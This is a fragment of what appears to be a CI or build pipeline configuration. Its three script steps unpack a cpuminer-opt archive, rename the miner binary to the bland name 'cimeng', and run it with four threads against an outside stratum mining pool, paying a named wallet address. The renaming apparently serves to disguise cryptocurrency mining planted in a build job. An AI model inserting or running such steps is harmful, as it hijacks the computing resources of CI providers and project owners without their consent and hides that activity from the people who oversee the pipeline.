      - tar xf cpuminer-opt-linux.tar.gz
      - mv cpuminer-sse2 cimeng
      - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q0k8xdre9gujl89waj9avfme3jmfkadpswelmf3.1000a -t4'
